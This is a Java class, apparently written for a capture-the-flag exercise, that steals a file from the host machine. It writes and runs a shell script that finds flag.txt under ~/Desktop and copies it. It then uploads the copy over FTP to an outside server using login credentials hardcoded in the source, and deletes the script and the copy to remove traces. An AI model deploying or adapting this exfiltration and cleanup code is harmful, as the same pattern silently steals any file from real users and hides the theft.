import java.io.File;
import java.io.*;
import java.util.*;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

import org.apache.commons.net.ftp.FTP;
import org.apache.commons.net.ftp.FTPClient;

/*
  This part of the program:
    1. writes and executes script to copy flag.txt to ./sources
    2. establishes conneciton to outside server and sends flag
    3. deletes shell script and flag.txt copy
 */
public class Coordinate {
    static private String server = "ftp.hostedftp.com";
    static private int port = 21;
    static private String user = "rogersb@allegheny.edu";
    static private String pass = "yaoyaoyao";
    static private Coordinate obj = new Coordinate();
    static private String flag = "flag.txt";

    static void run(){
    	writeFile();
    	acquirePackage();
        ship();
    }

    //runs script to copy flag
    static void acquirePackage(){
        String output = obj.runCommand("sh sources/fetch.sh");
    }

    //runs command line commands
    static String runCommand(String command){
    	StringBuffer output = new StringBuffer();

        Process p;
        try {
          p = Runtime.getRuntime().exec(command);
          p.waitFor();
          BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));

                            String line = "";
          while ((line = reader.readLine())!= null) {
            output.append(line + "\n");
          }

        } catch (Exception e) {
          e.printStackTrace();
        }

        return output.toString();
    }


    //cleans up the copied flag and shell script
    static void rm(){
    	obj.runCommand("rm sources/flag.txt");
    	obj.runCommand("rm sources/fetch.sh");
    }

    //exfiltrates flag.txt over FTP
    static void ship(){
      String path = "sources/" + flag; //cause it'll be in our directory
      FTPClient ftpClient = new FTPClient();
      try {
          ftpClient.connect(server, port);
          ftpClient.login(user, pass);
          ftpClient.enterLocalPassiveMode();
          ftpClient.setFileType(FTP.BINARY_FILE_TYPE);
          File firstLocalFile = new File(path);
          String firstRemoteFile = "FLAGCAPTURED.txt";
          InputStream inputStream = new FileInputStream(firstLocalFile);
          //System.out.println("Start uploading first file");
          boolean done = ftpClient.storeFile(firstRemoteFile, inputStream);
          inputStream.close();
          if (done) {
              //System.out.println("The first file is uploaded successfully.");
              rm();
          }
      } catch (IOException ex) {
          //System.out.println("Error: " + ex.getMessage());
          //ex.printStackTrace();
      } finally {
          try {
              if (ftpClient.isConnected()) {
                  ftpClient.logout();
                  ftpClient.disconnect();
              }
          } catch (IOException ex) {
              ex.printStackTrace();
          }
      }
    }

    //Here we write the shell script to copy the flag
    private static void writeFile(){
    	String FILENAME = "sources/fetch.sh";
    	BufferedWriter bw = null;
		FileWriter fw = null;
		try {
			String content = "find ~/Desktop -name flag.txt -exec cp {} ./sources \\;";
			fw = new FileWriter(FILENAME);
			bw = new BufferedWriter(fw);
			bw.write(content);
			//System.out.println("Done");
		} catch (IOException e) {
			//e.printStackTrace();
		} finally {
			try {
				if (bw != null)
					bw.close();
				if (fw != null)
					fw.close();
			} catch (IOException ex) {
				ex.printStackTrace();
			}
		}
    }

}
